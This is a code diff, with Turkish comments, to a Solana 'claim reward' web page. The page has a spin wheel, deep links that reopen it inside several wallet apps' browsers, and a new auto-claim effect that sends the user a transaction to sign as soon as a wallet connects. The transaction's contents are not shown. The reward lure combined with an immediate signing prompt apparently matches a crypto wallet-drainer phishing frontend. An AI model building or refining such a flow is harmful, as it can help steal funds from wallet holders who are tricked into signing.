@@ -39,7 +39,9 @@ export default function Page() {
         window.addEventListener('scroll', lock)
         return () => window.removeEventListener('scroll', lock)
       }
-    } catch {}
+    } catch {
+      /* ignore */
+    }
   }, [])
 
   /* ——— Çark (spin) durumu ——— */
@@ -81,13 +83,13 @@ export default function Page() {
   const origin = typeof window !== 'undefined' ? window.location.origin : ''
   const dappUrl = encodeURIComponent(origin)
 
-  /* ——— Phantom deeplink ——— */
+  /* ——— Phantom deeplink fonksiyonu ——— */
   const openPhantomBrowser = () => {
     const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
     window.open(universal, '_blank')
   }
 
-  /* ——— Cüzdan yapılandırmaları ——— */
+  /* ——— Cüzdan yapılandırmaları & sıralama ——— */
   interface WalletConfig {
     match: (name: string) => boolean
     label: string
@@ -95,12 +97,44 @@ export default function Page() {
     deepLink: string
   }
   const walletConfigs: WalletConfig[] = [
-    { match: (n) => n === 'Phantom', label: 'Phantom',     icon: '/phantom.svg',   deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}` },
-    { match: (n) => n.toLowerCase().includes('trust'),    label: 'Trust Wallet', icon: '/trustwallet.svg', deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}` },
-    { match: (n) => n.toLowerCase().includes('coinbase'), label: 'Coinbase',     icon: '/coinbase.svg',    deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}` },
-    { match: (n) => n.toLowerCase().includes('bitkeep') || n.toLowerCase().includes('bitget'), label: 'Bitget', icon: '/bitget.svg', deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}` },
-    { match: (n) => n === 'Solflare', label: 'Solflare',   icon: '/solflare.svg', deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
-    { match: (n) => n === 'Backpack', label: 'Backpack',   icon: '/backpack.svg', deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
+    {
+      match: (n) => n === 'Phantom',
+      label: 'Phantom',
+      icon: '/phantom.svg',
+      deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`,
+    },
+    {
+      match: (n) => n.toLowerCase().includes('trust'),
+      label: 'Trust Wallet',
+      icon: '/trustwallet.svg',
+      deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}`,
+    },
+    {
+      match: (n) => n.toLowerCase().includes('coinbase'),
+      label: 'Coinbase Wallet',
+      icon: '/coinbase.svg',
+      deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}`,
+    },
+    {
+      match: (n) =>
+        n.toLowerCase().includes('bitkeep') ||
+        n.toLowerCase().includes('bitget'),
+      label: 'Bitget Wallet',
+      icon: '/bitget.svg',
+      deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}`,
+    },
+    {
+      match: (n) => n === 'Solflare',
+      label: 'Solflare',
+      icon: '/solflare.svg',
+      deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}`,
+    },
+    {
+      match: (n) => n === 'Backpack',
+      label: 'Backpack',
+      icon: '/backpack.svg',
+      deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}`,
+    },
   ]
 
   type DrawerWallet = WalletConfig & {
@@ -117,12 +151,21 @@ export default function Page() {
 
   /* ——— Connect Wallet ——— */
   const handleConnect = async () => {
-    setLoading(true); setMsg('')
-    if (publicKey) { setLoading(false); return }
-    const installed = orderedWallets.filter((w) => w.readyState === WalletReadyState.Installed)
+    setLoading(true)
+    setMsg('')
+    if (publicKey) {
+      setLoading(false)
+      return
+    }
+    const installed = orderedWallets.filter(
+      (w) => w.readyState === WalletReadyState.Installed
+    )
     if (installed.length === 1) {
-      try { await select(installed[0].adapter.name as WalletName) }
-      catch (e) { console.error(e) }
+      try {
+        await select(installed[0].adapter.name as WalletName)
+      } catch (e) {
+        console.error(e)
+      }
     } else {
       openDrawer()
     }
@@ -131,10 +174,14 @@ export default function Page() {
 
   /* ——— Transaction gönderme ——— */
   const doTx = async (pk = publicKey!) => {
-    setMsg(''); setLoading(true)
+    setMsg('')
+    setLoading(true)
     try {
       const tx = await createUnsignedTransaction(pk)
-      if (!tx) { setMsg('Claim failed'); return }
+      if (!tx) {
+        setMsg('Claim failed')
+        return
+      }
       let signature: string
       if (wallet?.adapter && 'signAndSendTransaction' in wallet.adapter) {
         const res = await (wallet.adapter as any).signAndSendTransaction(tx, conn)
@@ -153,34 +200,39 @@ export default function Page() {
     }
   }
 
+  /* ——— Auto-claim için Ref & Effect ——— */
+  const autoClaim = useRef(false)
+  useEffect(() => {
+    if (autoClaim.current && publicKey) {
+      autoClaim.current = false
+      doTx()
+    }
+  }, [publicKey])
+
   /* ——— Claim Reward ——— */
   const handleClaim = async () => {
     if (loading) return
     setMsg('')
 
-    // 1) Eğer zaten bağlıysak → direkt işlem
+    // 1) Zaten bağlıysak → direkt işlem
     if (publicKey) {
+      setLoading(true)
       await doTx()
       return
     }
 
-    // 2) Tek bir Installed adapter varsa → otomatik bağlan & işlem
-    const installed = orderedWallets.filter((w) => w.readyState === WalletReadyState.Installed)
+    // 2) Tek bir Installed adapter varsa → işaretle, bağlan ve Effect başlatsın
+    const installed = orderedWallets.filter(
+      (w) => w.readyState === WalletReadyState.Installed
+    )
     if (installed.length === 1) {
       setLoading(true)
-      try {
-        const adapter = installed[0].adapter
-        await select(adapter.name as WalletName)
-        const pk = adapter.publicKey || publicKey!
-        await doTx(pk)
-      } catch (e) {
-        console.error(e)
-        setMsg('Claim failed')
-      }
+      autoClaim.current = true
+      await select(installed[0].adapter.name as WalletName)
       return
     }
 
-    // 3) Normal tarayıcı veya çoklu cüzdan → modal aç
+    // 3) Diğer durumlarda modal aç
     openDrawer()
   }
 
